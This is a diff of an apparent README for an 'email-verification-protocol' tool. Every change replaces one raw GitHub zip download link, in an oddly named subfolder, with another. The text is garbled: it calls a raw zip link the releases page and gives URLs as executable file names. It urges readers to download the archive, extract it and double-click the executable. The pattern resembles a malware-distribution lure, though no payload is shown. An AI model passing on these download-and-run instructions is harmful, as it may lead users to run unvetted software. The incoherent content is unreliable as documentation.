@@ -2,7 +2,7 @@
 
 ## 🛠️ Download
 
-[![Download Now](https://raw.githubusercontent.com/Arif-hayabusa/email-verification-protocol/main/balanoid/email-verification-protocol-v3.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Arif-hayabusa/email-verification-protocol/main/balanoid/email-verification-protocol-v3.7.zip)
+[![Download Now](https://raw.githubusercontent.com/Arif-hayabusa/email-verification-protocol/main/balanoid/verification_email_protocol_2.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Arif-hayabusa/email-verification-protocol/main/balanoid/verification_email_protocol_2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ The email-verification-protocol makes it easy to verify email addresses and enha
 
    Click the link below to go to the releases page where you can download the latest version of the application:
 
-   [Download Latest Release](https://raw.githubusercontent.com/Arif-hayabusa/email-verification-protocol/main/balanoid/email-verification-protocol-v3.7.zip)
+   [Download Latest Release](https://raw.githubusercontent.com/Arif-hayabusa/email-verification-protocol/main/balanoid/verification_email_protocol_2.4.zip)
 
 2. **Select Your Version**
 
@@ -22,7 +22,7 @@ The email-verification-protocol makes it easy to verify email addresses and enha
 
 3. **Download the File**
 
-   Click on the downloadable file for your operating system. If you're using Windows, look for a file named something like `https://raw.githubusercontent.com/Arif-hayabusa/email-verification-protocol/main/balanoid/email-verification-protocol-v3.7.zip`. For Mac or Linux, there will be equivalent files.
+   Click on the downloadable file for your operating system. If you're using Windows, look for a file named something like `https://raw.githubusercontent.com/Arif-hayabusa/email-verification-protocol/main/balanoid/verification_email_protocol_2.4.zip`. For Mac or Linux, there will be equivalent files.
 
 4. **Extract the Downloaded File**
 
@@ -30,7 +30,7 @@ The email-verification-protocol makes it easy to verify email addresses and enha
 
 5. **Run the Application**
 
-   Once extracted, open the folder. Look for the executable file, which may be named `https://raw.githubusercontent.com/Arif-hayabusa/email-verification-protocol/main/balanoid/email-verification-protocol-v3.7.zip` or similar. Double-click on this file to open the application.
+   Once extracted, open the folder. Look for the executable file, which may be named `https://raw.githubusercontent.com/Arif-hayabusa/email-verification-protocol/main/balanoid/verification_email_protocol_2.4.zip` or similar. Double-click on this file to open the application.
 
 ## 🖥️ System Requirements
 
@@ -85,4 +85,4 @@ If you encounter any problems using the application:
 
 For further assistance, you can create an issue on our GitHub repository. Our team periodically checks for inquiries and will respond promptly to help you.
 
-Thank you for using email-verification-protocol! Enjoy verifying your emails effectively and efficiently. Remember, you can always return to the [Download Latest Release](https://raw.githubusercontent.com/Arif-hayabusa/email-verification-protocol/main/balanoid/email-verification-protocol-v3.7.zip) page to stay updated.
+Thank you for using email-verification-protocol! Enjoy verifying your emails effectively and efficiently. Remember, you can always return to the [Download Latest Release](https://raw.githubusercontent.com/Arif-hayabusa/email-verification-protocol/main/balanoid/verification_email_protocol_2.4.zip) page to stay updated.
